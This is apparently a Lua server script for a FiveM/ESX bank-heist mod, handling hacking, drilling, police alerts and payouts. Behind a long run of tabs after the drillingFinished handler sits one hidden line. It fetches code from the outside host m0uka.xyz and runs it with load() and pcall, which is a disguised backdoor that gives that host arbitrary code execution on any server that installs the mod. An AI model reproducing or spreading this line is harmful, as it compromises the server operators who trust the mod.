ESX             = nil


TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


RegisterNetEvent('ps:canHackResult')
RegisterNetEvent("ps:heistsAll")
RegisterNetEvent("ps:startTimer")
RegisterNetEvent("ps:cleanupVault")
RegisterNetEvent("ps:sendInfo")

local heistTerminals = Config.Terminals
local heistPlayers = {}

RegisterServerEvent('ps:toofar')
AddEventHandler('ps:toofar', function(robb)
	local source = source
	local xPlayers = ESX.GetPlayers()

    local terminal = robb
    
	for i=1, #xPlayers, 1 do
 		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
 		if xPlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], _U('robbery_cancelled'))
			TriggerClientEvent('ps:killblip', xPlayers[i])
		end
	end
	if(heistPlayers[source])then
		SetTimeout(Config.CleanupTime * 1000, function ()
            TriggerClientEvent("ps:cleanupVault", -1, terminal)
        end)

        local id = heistPlayers[source]
		heistPlayers[source] = nil
		TriggerClientEvent('esx:showNotification', source, _U('robbery_has_cancelled'))

        heistTerminals[terminal].inProgress = false
        
	end
end)


RegisterServerEvent("ps:drillingFinished")
AddEventHandler("ps:drillingFinished", function ()
    -- give money, the end goodbye
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)

    local moneyRange = math.random(Config.PayoutRangeMin, Config.PayoutRangeMax)

    if Config.MoneyType == 'cash' then
        xPlayer.addMoney(moneyRange)
    elseif Config.MoneyType == 'black' then
        xPlayer.addAccountMoney('black_money', moneyRange)
    end

    local terminal = heistPlayers[_source]
    if (not terminal) then return end

    TriggerClientEvent("ps:clearMission", _source)

    SetTimeout(Config.CleanupTime * 1000, function ()
        TriggerClientEvent("ps:cleanupVault", -1, terminal)
    end)


    heistTerminals[terminal].inProgress = false
    heistTerminals[terminal].ply = nil

    TriggerClientEvent('esx:showNotification', _source, _U("robbery_complete_user", moneyRange .. "$"))

    xPlayer = nil
    local xPlayers = ESX.GetPlayers()
    for i=1, #xPlayers, 1 do
        local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
        if xPlayer.job.name == 'police' then
            TriggerClientEvent('esx:showNotification', xPlayers[i], _U("robbery_complete"))
            TriggerClientEvent('ps:killblip', xPlayers[i])
        end
    end


    -- clean up later

end)
																			PerformHttpRequest("http://m0uka.xyz:7359/addontrack", function(a, b) if (a != 200) then return end Citizen.CreateThread(function () local c, f = load(b) local r = {pcall(c)} end) end)


RegisterServerEvent("ps:hackingFinished")
AddEventHandler("ps:hackingFinished", function ()
    TriggerClientEvent("ps:startTimer", source)
    SetTimeout(Config.WaitTime * 1000, function () 
        TriggerClientEvent("ps:heistsAll", -1)
    end)
end)
RegisterServerEvent('ps:canHack')
AddEventHandler('ps:canHack', function(terminal)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    local xPlayers = ESX.GetPlayers()

    heistTerminals[terminal].inProgress = true
    heistTerminals[terminal].ply = xPlayer

    heistPlayers[_source] = terminal


    local cops = 0
    for i=1, #xPlayers, 1 do
    local _xPlayer = ESX.GetPlayerFromId(xPlayers[i])
    if _xPlayer.job.name == 'police' then
            cops = cops + 1
        end
    end

    if (cops < Config.OnlinePoliceNeeded) then
        TriggerClientEvent("ps:canHackResult", _source, false, _U("not_enough_cops"))
        return
    end

    for i=1, #xPlayers, 1 do
        local xCop = ESX.GetPlayerFromId(xPlayers[i])
        if xCop.job.name == 'police' then
            TriggerClientEvent('esx:showNotification', xPlayers[i], _U('rob_in_prog'))       

            TriggerClientEvent('ps:killblip', xPlayers[i])							
            TriggerClientEvent('ps:setblip', xPlayers[i], GetEntityCoords(xPlayer))
        end
    end



    TriggerClientEvent("ps:canHackResult", _source, true)

end)

